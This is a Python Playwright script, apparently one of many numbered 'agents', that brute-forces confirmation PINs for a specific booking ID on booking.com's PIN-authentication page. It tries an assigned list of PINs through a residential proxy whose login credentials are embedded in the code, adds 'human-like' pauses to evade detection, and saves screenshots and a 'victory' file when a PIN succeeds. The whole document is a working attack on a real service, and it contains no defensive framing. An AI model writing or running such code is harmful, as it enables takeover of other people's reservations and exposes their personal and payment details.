#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🎯 GHOSTFORM AGENT 099D
Batch: D | Agent: 99
Target: 6339614781
PINs: 2522, 6653, 2356, 6830, 5295
"""

from playwright.sync_api import sync_playwright
import time
import json
import os
from datetime import datetime

# Agent Configuration
AGENT_ID = "099D"
BOOKING_ID = "6339614781"
PINS = ['2522', '6653', '2356', '6830', '5295']
WAIT_TIME = 10  # Human-like 10 second wait between attempts

# File paths
LOG_FILE = f"agent_{AGENT_ID}_log.csv"
SUCCESS_FILE = f"victory_{AGENT_ID}.json"
SCREEN_DIR = f"screenshots_{AGENT_ID}"

os.makedirs(SCREEN_DIR, exist_ok=True)

def log_result(pin, result, url):
    """Log result to agent log"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, "a", encoding='utf-8') as f:
        f.write(f"{timestamp},BATCH_D,{AGENT_ID},{BOOKING_ID},{pin},{result},{url}\n")

def log_success(pin, url):
    """Log success to dedicated success file"""
    success_data = {
        "booking_id": BOOKING_ID,
        "success_pin": pin,
        "success_url": url,
        "agent": AGENT_ID,
        "batch": "D",
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    with open(SUCCESS_FILE, 'w', encoding='utf-8') as f:
        json.dump(success_data, f, indent=2)

print(f"🤖 BATCH D AGENT {AGENT_ID} DEPLOYING...")
print(f"🎯 Target: {BOOKING_ID}")
print(f"🔑 Assigned PINs: 2522, 6653, 2356, 6830, 5295")
print(f"🛡️ Proxy: pr.oxylabs.io:7777")

success_count = 0
fail_count = 0
unknown_count = 0
exception_count = 0

with sync_playwright() as p:
    # PROXY CONFIGURATION - STEALTH MODE ACTIVATED!
    proxy_config = {
        "server": "http://pr.oxylabs.io:7777",
        "username": "customer-oxy1p_hnzsA",
        "password": "oxy1p_hnzsA1"
    }
    print(f"🛡️ STEALTH MODE: Proxy configured - {proxy_config['server']}")
    
    browser = p.chromium.launch(
        headless=False,
        proxy=proxy_config
    )
    print(f"🌐 Browser launched with PROXY STEALTH!")
    page = browser.new_page()
    print("📄 New page created with stealth protection")

    for i, pin in enumerate(PINS, 1):
        print(f"🔑 Agent {AGENT_ID} - Testing PIN {i}/{len(PINS)}: {pin}")
        
        try:
            # LOGIC 1: Open browser and wait until completely loaded
            print("🌐 Opening booking.com...")
            page.goto("https://secure.booking.com/help/confirmation_pin_auth")
            print("⏳ Waiting for page to load completely...")
            page.wait_for_load_state("networkidle")  # Wait until no network activity
            print("✅ Page loaded completely!")

            # LOGIC 2: Fill booking ID and PIN, then click continue
            print("📝 Looking for booking ID field...")
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]')
            print(f"📝 Filling booking ID: {BOOKING_ID}")
            page.fill('input[placeholder="e.g. 1234567890"]', BOOKING_ID)
            
            print(f"🔐 Filling PIN: {pin}")
            page.fill('input[placeholder="e.g. 1234"]', pin)
            
            print("🔍 Looking for Continue button...")
            try:
                page.wait_for_selector('button:has-text("Continue")')
                print("✅ Clicking Continue button...")
                page.click('button:has-text("Continue")')
            except:
                page.wait_for_selector('button[type="submit"]')
                print("✅ Clicking Submit button...")
                page.click('button[type="submit"]')

            # LOGIC 3: Wait for results - either error banner OR URL change
            print("⏳ Waiting for results...")
            print("⏳ Giving extra time for page to redirect...")
            time.sleep(5)  # Extra wait for redirect
            
            # Wait for either success (URL change) or error banner to appear
            try:
                page.wait_for_function("""
                    () => {
                        // Check if URL contains success indicator
                        const urlChanged = window.location.href.includes('unique_order_id') || 
                                         window.location.href.includes('booking_details') ||
                                         window.location.href.includes('confirmation') ||
                                         window.location.href.includes('/help/reservation');
                        
                        // Check if error banner appears
                        const errorBanner = document.querySelector('.bui-alert--error') !== null ||
                                          document.querySelector('[class*="error"]') !== null ||
                                          document.querySelector('.alert-danger') !== null;
                        
                        return urlChanged || errorBanner;
                    }
                """, timeout=20000)
            except:
                print("⚠️ No clear result after 20s, checking current state...")

            # Check results
            current_url = page.url
            print(f"🔍 Current URL: {current_url}")
            
            # Check for various elements on the page
            error_elements = page.query_selector_all('.bui-alert--error, [class*="error"], .alert-danger')
            
            # Check for SUCCESS: URL contains success indicators
            if ("unique_order_id" in current_url or 
                "booking_details" in current_url or 
                "/help/reservation" in current_url or
                current_url != "https://secure.booking.com/help/confirmation_pin_auth"):
                print(f"🎉 SUCCESS! PIN {pin} is CORRECT! (URL changed)")
                print(f"✅ Success URL: {current_url}")
                page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_SUCCESS_{AGENT_ID}.png")
                log_result(pin, "SUCCESS", current_url)
                log_success(pin, current_url)
                success_count += 1
                print("🎉 SUCCESS FOUND! Mission accomplished!")
                break  # Stop testing, we found the PIN!
                
            # Check for FAILURE: error banner detected
            elif len(error_elements) > 0:
                print(f"❌ PIN {pin} is INCORRECT (error banner detected)")
                page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_FAIL_{AGENT_ID}.png")
                log_result(pin, "FAILURE", current_url)
                fail_count += 1
                
            else:
                print(f"❓ Unknown result for PIN {pin}")
                page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_UNKNOWN_{AGENT_ID}.png")
                log_result(pin, "UNKNOWN", current_url)
                unknown_count += 1

        except Exception as e:
            print(f"💥 Error with PIN {pin}: {e}")
            page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_EXCEPTION_{AGENT_ID}.png")
            log_result(pin, "EXCEPTION", page.url)
            exception_count += 1

        # Human-like pause before next PIN (except for last PIN)
        if i < len(PINS):
            print(f"⏳ Human breathing... waiting {WAIT_TIME}s before next PIN...")
            time.sleep(WAIT_TIME)

    browser.close()
    print(f"🏠 Agent {AGENT_ID} mission complete")

print(f"\n--- Agent {AGENT_ID} Summary ---")
print(f"Total attempts: {len(PINS)}")
print(f"Success: {success_count}")
print(f"Failure: {fail_count}")
print(f"Unknown: {unknown_count}")
print(f"Exception: {exception_count}")

if __name__ == "__main__":
    pass
